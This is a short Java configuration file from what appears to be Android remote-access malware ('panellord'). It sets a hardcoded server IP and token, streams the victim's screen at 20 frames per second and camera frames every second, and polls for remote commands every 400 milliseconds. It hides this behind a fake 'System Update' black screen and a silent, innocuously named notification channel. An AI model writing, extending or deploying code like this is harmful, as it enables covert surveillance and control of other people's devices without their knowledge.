package com.panellord;

public class Config {
    public static final String VPS_URL    = "http://52.221.192.216";
    public static final String USER_TOKEN = "USER_TOKEN_PLACEHOLDER";

    public static final long HEARTBEAT_INTERVAL_MS = 5_000;

    // Screen mirror — 50ms = 20 FPS, half resolution for fast upload
    public static final long SCREEN_FRAME_INTERVAL_MS = 50;
    public static final int  SCREEN_JPEG_QUALITY      = 18;

    // Command poll — every 400ms for near-instant control
    public static final long CMD_POLL_INTERVAL_MS = 400;

    public static final long CAMERA_FRAME_INTERVAL_MS = 1_000;

    public static final String BLACK_SCREEN_TEXT = "System Update\nPlease wait...";

    public static final int NOTIF_ID_MAIN   = 1001;
    public static final int NOTIF_ID_SCREEN = 1002;
    public static final int NOTIF_ID_CAMERA = 1003;

    public static final String NOTIF_CHANNEL    = "device_svc";
    public static final String NOTIF_CHANNEL_SL = "device_svc_silent";
}
